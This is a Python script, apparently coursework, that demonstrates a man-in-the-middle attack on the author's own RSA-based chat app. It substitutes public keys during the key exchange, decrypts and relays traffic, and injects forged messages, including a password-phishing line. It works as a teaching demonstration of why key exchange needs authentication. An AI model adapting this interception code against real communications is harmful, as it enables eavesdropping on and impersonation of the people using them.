"""
Demonstration of Man-in-the-Middle attack on the chat system
This simulates how an attacker could intercept and modify messages 
on 1st version of end-to-end encrypted chat (chat.py)
"""

import socket
import threading
import json
import time
from rsa_oaep import RSA_OAEP

class MITMAttacker:
    def __init__(self, target_ip="10.4.74.216", target_port=9999, proxy_port=8888):
        self.target_ip = target_ip
        self.target_port = target_port
        self.proxy_port = proxy_port
        
        # Generate attacker's own RSA keys
        self.rsa_instance = RSA_OAEP(2048)
        self.attacker_public, self.attacker_private = self.rsa_instance.generate_keypair()
        
        # Will store the real users' public keys
        self.user1_public_key = None
        self.user2_public_key = None
        
        # Socket connections
        self.user1_socket = None
        self.user2_socket = None
        self.real_server_socket = None
        
    def start_proxy_server(self):
        """
        Start the proxy server that users will connect to
        """
        proxy_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        proxy_server.bind(("0.0.0.0", self.proxy_port))
        proxy_server.listen(2)
        
        print(f"[ATTACKER] Proxy server started on port {self.proxy_port}")
        print("[ATTACKER] Waiting for connections...")
        
        # Accept first connection (will be user trying to connect)
        self.user1_socket, addr1 = proxy_server.accept()
        print(f"[ATTACKER] User 1 connected from {addr1}")
        
        # Connect to the real server (user 2)
        self.real_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.real_server_socket.connect((self.target_ip, self.target_port))
            print(f"[ATTACKER] Connected to real server at {self.target_ip}:{self.target_port}")
        except:
            print("[ATTACKER] Could not connect to real server. Make sure the host is running.")
            return
        
        # Intercept and manipulate the key exchange
        self.intercept_key_exchange()
        
        # Start message interception
        threading.Thread(target=self.intercept_user1_messages, daemon=True).start()
        threading.Thread(target=self.intercept_server_messages, daemon=True).start()
        
        print("[ATTACKER] MITM attack is now active!")
        print("[ATTACKER] Press Enter to send malicious messages...")
        
        # Interactive malicious message sending
        while True:
            input()  # Wait for Enter press
            self.send_malicious_message()
    
    def intercept_key_exchange(self):
        """
        Intercept and replace public keys during exchange
        """
        print("[ATTACKER] Intercepting key exchange...")
        
        # Receive real server's public key
        server_key_data = self.real_server_socket.recv(2048).decode()
        self.user2_public_key = tuple(json.loads(server_key_data))
        print("[ATTACKER] Captured server's public key")
        
        # Send our fake key to user 1 (pretending to be the server)
        fake_key_json = json.dumps(self.attacker_public)
        self.user1_socket.send(fake_key_json.encode())
        print("[ATTACKER] Sent fake key to user 1")
        
        # Receive user 1's public key
        user1_key_data = self.user1_socket.recv(2048).decode()
        self.user1_public_key = tuple(json.loads(user1_key_data))
        print("[ATTACKER] Captured user 1's public key")
        
        # Send our fake key to server (pretending to be user 1)
        fake_key_json = json.dumps(self.attacker_public)
        self.real_server_socket.send(fake_key_json.encode())
        print("[ATTACKER] Sent fake key to server")
        
        print("[ATTACKER] Key exchange compromised! Both users think they're talking to each other.")
    
    def intercept_user1_messages(self):
        """
        Intercept messages from user 1 to server
        """
        while True:
            try:
                # Receive encrypted message from user 1
                encrypted_data = self.user1_socket.recv(2048).decode()
                encrypted_message = json.loads(encrypted_data)
                
                # Decrypt with our private key (since user 1 encrypted with our public key)
                original_message = self.rsa_instance.decrypt_string(encrypted_message, self.attacker_private)
                print(f"[ATTACKER] Intercepted from User 1: '{original_message}'")
                
                # Re-encrypt for the real server and forward
                re_encrypted = self.rsa_instance.encrypt_string(original_message, self.user2_public_key)
                self.real_server_socket.send(json.dumps(re_encrypted).encode())
                print(f"[ATTACKER] Forwarded to server: '{original_message}'")
                
            except:
                break
    
    def intercept_server_messages(self):
        """
        Intercept messages from server to user 1
        """
        while True:
            try:
                # Receive encrypted message from server
                encrypted_data = self.real_server_socket.recv(2048).decode()
                encrypted_message = json.loads(encrypted_data)
                
                # Decrypt with our private key
                original_message = self.rsa_instance.decrypt_string(encrypted_message, self.attacker_private)
                print(f"[ATTACKER] Intercepted from Server: '{original_message}'")
                
                # Re-encrypt for user 1 and forward (unchanged for now)
                re_encrypted = self.rsa_instance.encrypt_string(original_message, self.user1_public_key)
                self.user1_socket.send(json.dumps(re_encrypted).encode())
                print(f"[ATTACKER] Forwarded to User 1: '{original_message}'")
                
            except:
                break
    
    def send_malicious_message(self):
        """
        Send a malicious message to user 1
        """
        malicious_messages = [
            "I never said that! This is a fake message from the attacker!",
            "Your account has been compromised - send me your password!",
            "This message was intercepted and replaced by an attacker!",
            "The original message was modified by a man-in-the-middle!",
            "HACKED! This demonstrates how MITM attacks work!"
        ]
        
        import random
        malicious_msg = random.choice(malicious_messages)
        
        # Encrypt malicious message with user 1's public key
        encrypted_malicious = self.rsa_instance.encrypt_string(malicious_msg, self.user1_public_key)
        self.user1_socket.send(json.dumps(encrypted_malicious).encode())
        
        print(f"[ATTACKER] Sent malicious message to User 1: '{malicious_msg}'")

if __name__ == "__main__":
    print("="*60)
    print("MAN-IN-THE-MIDDLE ATTACK DEMONSTRATION")
    print("="*60)
    print("This demonstrates how MITM attacks work in educational settings")
    print("INSTRUCTIONS:")
    print("1. First, start one instance of your chat app as HOST (option 1)")
    print("2. Then run this MITM script")
    print("3. Finally, start another chat app instance as CLIENT (option 2)")
    print("   BUT make it connect to port 8888 instead of 9999")
    print("4. Watch as messages are intercepted and malicious ones injected")
    print("="*60)
    
    attacker = MITMAttacker()
    
    try:
        attacker.start_proxy_server()
    except KeyboardInterrupt:
        print("\n[ATTACKER] Attack stopped.")
    except Exception as e:
        print(f"[ATTACKER] Error: {e}")